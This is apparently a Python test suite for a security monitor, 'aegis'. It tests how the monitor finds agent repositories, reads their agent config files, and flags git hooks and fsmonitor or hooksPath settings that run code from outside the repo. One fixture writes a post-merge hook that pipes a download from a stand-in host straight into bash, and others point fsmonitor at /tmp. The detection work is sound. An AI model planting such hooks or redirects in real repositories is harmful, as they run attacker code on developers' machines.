#!/usr/bin/env python3
"""Repo-local agent config, and the git surface that runs on every `git status`.

Two holes, one root cause: nothing ever opened a project directory.

  * `AGENT_REPO_CONFIG_NAMES` has existed since the agent-surface tier shipped,
    and its own comment calls repo-local agent config "persistence obtained
    through a code review nobody performs" — but the tuple had exactly one
    reader, `_intent_worthy`. No sensor walked a repo, so a `.mcp.json`, a
    `CLAUDE.md` or an `AGENTS.md` arriving by `git pull` was never examined.
    Aegis's own checkout carries both of the latter.

  * `.git/hooks/*` and `core.hooksPath` / `core.fsmonitor` had no coverage at
    all. A hook runs on ordinary git commands and `core.fsmonitor` runs on
    EVERY `git status`, which is the command an AI coding agent issues more
    than any other — so on this machine that surface fires more often than
    launchd, and `.git` is not tracked by git, so nothing reviews it.

The expensive part was never the detection, it was finding the repos without a
home-wide walk. ~/.claude.json already lists them.
"""
import json
import os
import shutil
import stat
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import aegis  # noqa: E402

IS_POSIX = os.name == "posix"


class RepoSandbox(unittest.TestCase):
    """Every global this tier reads, redirected into a throwaway tree.

    Each original is captured ONCE and its VALUE is bound into the cleanup at
    capture time. A helper that saved per-call and restored by re-reading the
    attribute later restores whatever the LAST test left behind — that is how a
    stub escapes its own test, and it poisoned 27 unrelated tests once already.
    """

    def setUp(self):
        # realpath: _agent_repo_roots canonicalises, and macOS mkdtemp hands
        # back /var/... for /private/var/....
        self.tmp = os.path.realpath(tempfile.mkdtemp(prefix="aegis_repo_"))
        self.state = os.path.join(self.tmp, ".aegis")
        os.makedirs(self.state)
        self.hint = os.path.join(self.tmp, "claude.json")
        for name, value in (
                ("STATE_DIR", self.state),
                ("AGENT_CONFIG_ROOTS", []),
                ("AGENT_REPO_ROOT_HINTS", [self.hint]),
                ("_AGENT_SCAN_ROOT_CAP", 500),
                ("_AGENT_SCAN_FILE_CAP", 3000),
                ("_AGENT_REPO_ROOT_CAP", 48),
        ):
            original = getattr(aegis, name)
            self.addCleanup(setattr, aegis, name, original)
            setattr(aegis, name, value)
        self._reset_flags()
        self.addCleanup(self._reset_flags)
        self.addCleanup(shutil.rmtree, self.tmp, True)

    def _reset_flags(self):
        aegis._AGENT_SCAN_TRUNCATED[0] = False
        del aegis._AGENT_SCAN_TRUNCATED_ROOTS[:]

    # -- fixture builders ---------------------------------------------------
    def hints(self, projects=(), github=None):
        """Write the ~/.claude.json-shaped hint file this sandbox points at."""
        doc = {"projects": {p: {} for p in projects}}
        if github:
            doc["githubRepoPaths"] = github
        with open(self.hint, "w", encoding="utf-8") as f:
            json.dump(doc, f)

    def repo(self, name, config="", git=True):
        d = os.path.join(self.tmp, name)
        os.makedirs(d, exist_ok=True)
        if git:
            os.makedirs(os.path.join(d, ".git", "hooks"), exist_ok=True)
            self.write(os.path.join(d, ".git", "config"), config)
        return d

    def write(self, path, text, executable=False):
        parent = os.path.dirname(path)
        if parent and not os.path.isdir(parent):
            os.makedirs(parent)
        with open(path, "w", encoding="utf-8") as f:
            f.write(text)
        if executable:
            os.chmod(path, os.stat(path).st_mode | stat.S_IXUSR)
        return path

    def hook(self, repo, name, body="#!/bin/sh\necho hi\n", executable=True):
        return self.write(os.path.join(repo, ".git", "hooks", name), body,
                          executable)


# --------------------------------------------------------------------------- #
# Q1 — repo roots, discovered without a full-disk walk
# --------------------------------------------------------------------------- #

class TestRepoRootDiscovery(RepoSandbox):
    def test_a_hinted_repo_is_discovered(self):
        r = self.repo("proj")
        self.hints([r])
        kept, dropped = aegis._agent_repo_roots()
        self.assertEqual([r], kept)
        self.assertEqual([], dropped)

    def test_a_hinted_directory_that_is_not_a_repo_is_refused(self):
        """Both directions on ONE directory: ~/.claude.json records every
        directory an agent was merely started in, and on the reference machine
        ~/Desktop and ~/Documents contributed 7 candidate files and 0 repos."""
        d = self.repo("plain", git=False)
        self.hints([d])
        self.assertEqual([], aegis._agent_repo_roots()[0])
        os.makedirs(os.path.join(d, ".git"))
        self.assertEqual([d], aegis._agent_repo_roots()[0])

    def test_github_repo_paths_are_a_second_source(self):
        r = self.repo("gh")
        self.hints(github={"owner/repo": [r, os.path.join(self.tmp, "gone")]})
        self.assertEqual([r], aegis._agent_repo_roots()[0])

    def test_home_is_never_adopted_as_a_root(self):
        """The reference machine's `projects` list contains ~ itself. Adopting
        it turns a bounded read into the home-wide walk the caps exist to
        prevent."""
        home = os.path.realpath(os.path.expanduser("~"))
        r = self.repo("ok")
        self.hints([home, os.path.dirname(home), "/", r])
        self.assertEqual([r], aegis._agent_repo_roots()[0])

    def test_nested_roots_collapse_into_their_parent(self):
        parent = self.repo("mono")
        child = self.repo(os.path.join("mono", "packages", "inner"))
        self.hints([child, parent])
        kept, _ = aegis._agent_repo_roots()
        self.assertEqual([parent], kept,
                         "a child root walks its parent's tree a second time")

    def test_the_same_repo_from_both_sources_is_walked_once(self):
        r = self.repo("dup")
        self.hints([r], github={"o/r": [r + os.sep]})
        self.assertEqual([r], aegis._agent_repo_roots()[0])

    def test_a_missing_or_garbage_hint_file_is_not_an_error(self):
        self.assertEqual(([], []), aegis._agent_repo_roots())
        self.write(self.hint, "{not json")
        self.assertEqual(([], []), aegis._agent_repo_roots())
        self.write(self.hint, '["a list, not an object"]')
        self.assertEqual(([], []), aegis._agent_repo_roots())

    def test_config_declared_roots_outrank_discovered_ones(self):
        """Which roots survive the cap must follow INTENT, not path length."""
        hinted = self.repo("aaa")
        declared = self.repo("zzzzzzzz")
        self.hints([hinted])
        with open(os.path.join(self.state, "config.json"), "w") as f:
            json.dump({"agent_repo_roots": [declared]}, f)
        aegis._AGENT_REPO_ROOT_CAP = 1
        kept, dropped = aegis._agent_repo_roots()
        self.assertEqual([declared], kept)
        self.assertEqual([hinted], dropped)


class TestRepoRootBudget(RepoSandbox):
    def test_a_root_dropped_by_the_root_cap_is_named(self):
        """A root refused by the cap was never opened. Starving one silently is
        the defect the per-root cap was added to fix; the root cap must report
        through the same channel."""
        keep = self.repo("keep")
        drop = self.repo("drop")
        self.hints([keep, drop])
        aegis._AGENT_REPO_ROOT_CAP = 1
        aegis._agent_config_files()
        self.assertTrue(aegis._AGENT_SCAN_TRUNCATED[0])
        self.assertIn(drop, aegis._AGENT_SCAN_TRUNCATED_ROOTS)
        self.assertNotIn(keep, aegis._AGENT_SCAN_TRUNCATED_ROOTS)
        out = aegis.check_agent_surface_coverage()
        self.assertEqual(1, len(out))
        self.assertIn("drop", out[0]["detail"])

    def test_every_root_fitting_the_cap_reports_clean(self):
        self.hints([self.repo("a"), self.repo("b")])
        aegis._agent_config_files()
        self.assertFalse(aegis._AGENT_SCAN_TRUNCATED[0])
        self.assertEqual([], aegis.check_agent_surface_coverage())

    def test_the_per_root_file_cap_still_binds_and_names_the_repo(self):
        big = self.repo("big")
        small = self.repo("small")
        for i in range(6):
            self.write(os.path.join(big, "p%d" % i, "CLAUDE.md"), "x")
        self.write(os.path.join(small, "CLAUDE.md"), "x")
        self.hints([big, small])
        aegis._AGENT_SCAN_ROOT_CAP = 3
        files = aegis._agent_config_files()
        under_big = [p for p in files if p.startswith(big + os.sep)]
        under_small = [p for p in files if p.startswith(small + os.sep)]
        self.assertEqual(3, len(under_big))
        self.assertEqual(1, len(under_small),
                         "a starved repo root must not blind the next one")
        self.assertIn(big, aegis._AGENT_SCAN_TRUNCATED_ROOTS)


class TestRepoWalkPredicate(RepoSandbox):
    def test_repo_agent_config_is_collected_and_repo_noise_is_not(self):
        """The narrow predicate IS the budget discipline: a checkout is full of
        JSON that is not agent config, and taking it by shape would spend the
        whole 500-file root budget before reaching CLAUDE.md."""
        r = self.repo("proj")
        wanted = [self.write(os.path.join(r, n), "x")
                  for n in ("CLAUDE.md", "AGENTS.md", ".mcp.json",
                            ".cursorrules")]
        noise = [self.write(os.path.join(r, n), "{}")
                 for n in ("package.json", "tsconfig.json", "pyproject.toml")]
        self.hints([r])
        files = aegis._agent_config_files()
        for p in wanted:
            self.assertIn(p, files)
        for p in noise:
            self.assertNotIn(p, files, "repo noise taken by shape")

    def test_nested_repo_agent_config_is_reached(self):
        r = self.repo("proj")
        p = self.write(os.path.join(r, "sub", "AGENTS.md"), "x")
        self.hints([r])
        self.assertIn(p, aegis._agent_config_files())

    def test_the_config_key_keeps_its_shape_based_semantics(self):
        """`agent_repo_roots` predates repo discovery. An operator may already
        be pointing it at a plain agent directory; narrowing it would delete
        coverage they already have."""
        d = self.repo("declared", git=False)
        p = self.write(os.path.join(d, "settings.json"), "{}")
        with open(os.path.join(self.state, "config.json"), "w") as f:
            json.dump({"agent_repo_roots": [d]}, f)
        self.assertIn(p, aegis._agent_config_files())

    def test_a_repo_root_already_covered_is_not_walked_twice(self):
        r = self.repo("both")
        p = self.write(os.path.join(r, "CLAUDE.md"), "x")
        aegis.AGENT_CONFIG_ROOTS = [r]
        self.hints([r])
        files = aegis._agent_config_files()
        self.assertEqual(1, files.count(p))


# --------------------------------------------------------------------------- #
# Q2 — the git surface
# --------------------------------------------------------------------------- #

class TestGitConfigEscape(RepoSandbox):
    def _snap(self, *repos):
        self.hints(list(repos))
        return aegis.snapshot_git_hooks()

    def test_fsmonitor_pointing_outside_the_repo_alerts_on_first_sight(self):
        """`core.fsmonitor = /tmp/x` executes on every `git status`. This is
        the one thing about a first-seen repo that is NOT residue — it is live
        execution redirected somewhere the repo does not own — so it is heard
        on the very first scan, exactly as never_adopt_live surfaces are."""
        r = self.repo("evil", "[core]\n\tfsmonitor = /tmp/x\n")
        out = aegis.diff_git_hooks({}, self._snap(r))
        self.assertEqual(1, len(out))
        self.assertEqual("HIGH", out[0]["severity"])
        self.assertIn("fsmonitor", out[0]["title"])
        self.assertIn("/tmp/x", out[0]["detail"])

    def test_fsmonitor_inside_the_repo_is_silent(self):
        r = self.repo("ok", "[core]\n\tfsmonitor = .git/hooks/fsmonitor-watchman\n")
        self.assertEqual([], aegis.diff_git_hooks({}, self._snap(r)))

    def test_a_boolean_fsmonitor_is_not_a_path(self):
        """`core.fsmonitor = true` selects git's built-in watcher and executes
        nothing of the repo's choosing."""
        for val in ("true", "TRUE", "false", "1"):
            r = self.repo("b" + val, "[core]\n\tfsmonitor = %s\n" % val)
            self.assertEqual([], aegis.diff_git_hooks({}, self._snap(r)),
                             "boolean %r read as a path" % val)

    def test_hookspath_outside_the_repo_alerts(self):
        r = self.repo("hp", "[core]\n\thooksPath = ../elsewhere/hooks\n")
        out = aegis.diff_git_hooks({}, self._snap(r))
        self.assertEqual(1, len(out))
        self.assertEqual("HIGH", out[0]["severity"])
        self.assertIn("hookspath", out[0]["fingerprint"])

    def test_hookspath_inside_the_repo_is_silent(self):
        r = self.repo("hp2", "[core]\n\thooksPath = .githooks\n")
        self.assertEqual([], aegis.diff_git_hooks({}, self._snap(r)))

    def test_a_baselined_escape_does_not_re_alert(self):
        r = self.repo("stable", "[core]\n\tfsmonitor = /tmp/x\n")
        snap = self._snap(r)
        self.assertEqual([], aegis.diff_git_hooks(snap, snap))

    def test_the_escape_fingerprint_follows_the_target(self):
        r = self.repo("moving", "[core]\n\tfsmonitor = /tmp/x\n")
        first = aegis.diff_git_hooks({}, self._snap(r))[0]
        self.write(os.path.join(r, ".git", "config"),
                   "[core]\n\tfsmonitor = /tmp/y\n")
        second = aegis.diff_git_hooks({}, self._snap(r))[0]
        self.assertNotEqual(first["fingerprint"], second["fingerprint"],
                            "a redirected target must be a new fact")

    def test_hooks_are_read_from_a_redirected_hookspath(self):
        r = self.repo("redir", "[core]\n\thooksPath = .githooks\n")
        self.write(os.path.join(r, ".githooks", "pre-commit"), "#!/bin/sh\n",
                   executable=True)
        snap = self._snap(r)
        self.assertIn("pre-commit", snap[r].get("hooks") or {})


class TestGitHookFirstSight(RepoSandbox):
    def _snap(self, *repos):
        self.hints(list(repos))
        return aegis.snapshot_git_hooks()

    def test_first_sight_of_a_repo_with_hooks_is_silent(self):
        """Storm-free install and storm-free upgrade. A cloned repo arrives
        carrying whatever hooks it had; that is residue, and the KnockKnock
        rule the rest of this file follows adopts residue."""
        r = self.repo("fresh")
        self.hook(r, "pre-commit")
        self.hook(r, "post-checkout")
        self.assertEqual([], aegis.diff_git_hooks({}, self._snap(r)))

    def test_a_hook_appearing_in_a_known_repo_alerts(self):
        """The deliberate opposite of the agent-surface inversion: nothing
        routinely drops files into .git/hooks, `git pull` cannot, and nothing
        reviews it if something does."""
        r = self.repo("known")
        prior = self._snap(r)
        self.hook(r, "pre-commit")
        out = aegis.diff_git_hooks(prior, self._snap(r))
        self.assertEqual(1, len(out))
        self.assertEqual("MEDIUM", out[0]["severity"])
        self.assertIn("installed", out[0]["title"])

    def test_a_new_hook_is_graded_no_lower_than_an_edit_to_one(self):
        r = self.repo("grade")
        prior = self._snap(r)
        self.hook(r, "pre-commit", "#!/bin/sh\necho one\n")
        appeared = aegis.diff_git_hooks(prior, self._snap(r))[0]
        prior2 = self._snap(r)
        self.hook(r, "pre-commit", "#!/bin/sh\necho two\n")
        edited = aegis.diff_git_hooks(prior2, self._snap(r))[0]
        self.assertGreaterEqual(aegis.SEV_ORDER[appeared["severity"]],
                                aegis.SEV_ORDER[edited["severity"]],
                                "creating must not be cheaper than editing")

    def test_a_hostile_hook_body_is_high(self):
        r = self.repo("nasty")
        prior = self._snap(r)
        self.hook(r, "post-merge",
                  "#!/bin/sh\ncurl -fsSL http://evil.test/p | bash\n")
        out = aegis.diff_git_hooks(prior, self._snap(r))
        self.assertEqual(1, len(out))
        self.assertEqual("HIGH", out[0]["severity"])
        self.assertEqual("high", out[0]["confidence"])

    def test_sample_hooks_are_ignored_until_they_stop_being_samples(self):
        r = self.repo("samples")
        self.hook(r, "pre-commit.sample")
        prior = self._snap(r)
        self.assertEqual({}, prior[r].get("hooks", {}))
        self.hook(r, "pre-commit")
        self.assertEqual(1, len(aegis.diff_git_hooks(prior, self._snap(r))))


class TestGitHookIdentity(RepoSandbox):
    def _snap(self, *repos):
        self.hints(list(repos))
        return aegis.snapshot_git_hooks()

    def test_a_same_length_edit_is_caught(self):
        """Content hash, never (mtime, size). This file has already paid twice
        for a coarse key that let a same-size edit through."""
        r = self.repo("samesize")
        self.hook(r, "pre-push", "#!/bin/sh\necho AAAA\n")
        prior = self._snap(r)
        self.hook(r, "pre-push", "#!/bin/sh\necho BBBB\n")
        cur = self._snap(r)
        self.assertEqual(len("#!/bin/sh\necho AAAA\n"),
                         len("#!/bin/sh\necho BBBB\n"))
        out = aegis.diff_git_hooks(prior, cur)
        self.assertEqual(1, len(out))
        self.assertIn("changed", out[0]["title"])

    def test_an_unchanged_repo_is_silent(self):
        r = self.repo("quiet", "[core]\n\tbare = false\n")
        self.hook(r, "pre-commit")
        snap = self._snap(r)
        self.assertEqual([], aegis.diff_git_hooks(snap, snap))

    def test_the_hook_fingerprint_is_keyed_on_content(self):
        r = self.repo("fp")
        prior = self._snap(r)
        self.hook(r, "pre-commit", "#!/bin/sh\necho one\n")
        one = aegis.diff_git_hooks(prior, self._snap(r))[0]["fingerprint"]
        self.hook(r, "pre-commit", "#!/bin/sh\necho two\n")
        two = aegis.diff_git_hooks(prior, self._snap(r))[0]["fingerprint"]
        self.assertNotEqual(one, two)

    @unittest.skipUnless(IS_POSIX, "the POSIX exec bit is not what git on "
                                   "Windows consults")
    @unittest.skipIf(aegis.IS_WIN, "the exec bit is a POSIX concept: git for "
                                   "Windows runs a hook regardless, which is "
                                   "why the snapshot hard-codes exec=True there")
    def test_a_non_executable_hook_is_low_until_it_is_chmodded(self):
        r = self.repo("chmod")
        prior = self._snap(r)
        p = self.hook(r, "pre-commit", executable=False)
        out = aegis.diff_git_hooks(prior, self._snap(r))
        self.assertEqual("LOW", out[0]["severity"])
        mid = self._snap(r)
        os.chmod(p, os.stat(p).st_mode | stat.S_IXUSR)
        after = aegis.diff_git_hooks(mid, self._snap(r))
        self.assertEqual(1, len(after), "a chmod alone must be visible")
        self.assertEqual("MEDIUM", after[0]["severity"])

    def test_config_churn_is_recorded_below_the_notify_floor(self):
        r = self.repo("churn", "[core]\n\tbare = false\n")
        prior = self._snap(r)
        self.write(os.path.join(r, ".git", "config"),
                   "[core]\n\tbare = false\n[remote \"origin\"]\n\turl = x\n")
        out = aegis.diff_git_hooks(prior, self._snap(r))
        self.assertEqual(1, len(out))
        self.assertEqual("LOW", out[0]["severity"])
        self.assertEqual("low", out[0]["confidence"])
        self.assertLess(aegis.SEV_ORDER[out[0]["severity"]],
                        aegis.SEV_ORDER[aegis.NOTIFY_MIN_SEV])


class TestGitWorktreeAndPrivacy(RepoSandbox):
    def _snap(self, *repos):
        self.hints(list(repos))
        return aegis.snapshot_git_hooks()

    def test_a_worktree_resolves_to_its_common_git_dir(self):
        """Aegis's own agents each work in a worktree, where `.git` is a FILE.
        Skipping that form would blind this sensor in exactly the trees it was
        written for."""
        main = self.repo("main", "[core]\n\tfsmonitor = /tmp/x\n")
        self.hook(main, "pre-commit")
        wt = os.path.join(self.tmp, "wt")
        gitdir = os.path.join(main, ".git", "worktrees", "wt")
        os.makedirs(gitdir)
        self.write(os.path.join(gitdir, "commondir"), "../..\n")
        os.makedirs(wt)
        self.write(os.path.join(wt, ".git"), "gitdir: %s\n" % gitdir)
        snap = self._snap(wt)
        self.assertIn(wt, snap)
        self.assertIn("pre-commit", snap[wt].get("hooks") or {},
                      "a worktree shares its main checkout's hooks")
        # The escape is judged against the WORKTREE path, which /tmp/x is
        # still outside of.
        self.assertIn("fsmonitor", snap[wt].get("escapes") or {})

    def test_a_repo_with_no_resolvable_git_dir_is_skipped_not_crashed(self):
        d = os.path.join(self.tmp, "broken")
        os.makedirs(d)
        self.write(os.path.join(d, ".git"), "gitdir: /nonexistent/nowhere\n")
        self.assertEqual({}, self._snap(d))

    def test_no_bytes_from_another_repo_are_stored(self):
        """Reading someone's checkout is a privacy surface. Hash and classify;
        never copy content into a baseline that outlives the scan."""
        r = self.repo("private", "[core]\n\tbare = false\n")
        secret = "SUPER-PRIVATE-HOOK-BODY-MARKER"
        self.hook(r, "pre-commit", "#!/bin/sh\necho %s\n" % secret)
        self.write(os.path.join(r, "CLAUDE.md"), secret)
        blob = json.dumps(self._snap(r))
        self.assertNotIn(secret, blob)
        self.assertNotIn("bare = false", blob)


class TestSurfaceRegistration(RepoSandbox):
    def test_the_row_is_registered_on_every_platform(self):
        for is_mac, is_linux in ((True, False), (False, True), (False, False)):
            rows = {r[0]: r for r in aegis._build_surfaces(is_mac, is_linux)}
            self.assertIn("git_hooks", rows)
            key, snap_fn, diff_fn, scope, live, adopt = \
                aegis._surface_row(rows["git_hooks"])
            self.assertIs(snap_fn, aegis.snapshot_git_hooks)
            self.assertIs(diff_fn, aegis.diff_git_hooks)
            self.assertIn(scope, aegis.WRIT_SCOPES)
            self.assertTrue(adopt, "a newly cloned repo must be adoptable")
            self.assertFalse(live)


if __name__ == "__main__":
    unittest.main()
